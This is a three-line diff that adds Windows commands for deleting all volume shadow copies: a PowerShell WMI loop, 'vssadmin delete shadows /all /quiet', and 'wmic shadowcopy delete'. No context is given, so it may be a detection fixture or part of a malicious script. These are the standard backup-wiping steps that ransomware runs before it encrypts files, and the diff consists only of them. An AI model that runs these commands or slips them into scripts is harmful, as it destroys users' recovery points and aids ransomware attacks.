@@ -1,0 +1,3 @@
+Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+vssadmin.exe delete shadows /all /quiet
+wmic shadowcopy delete
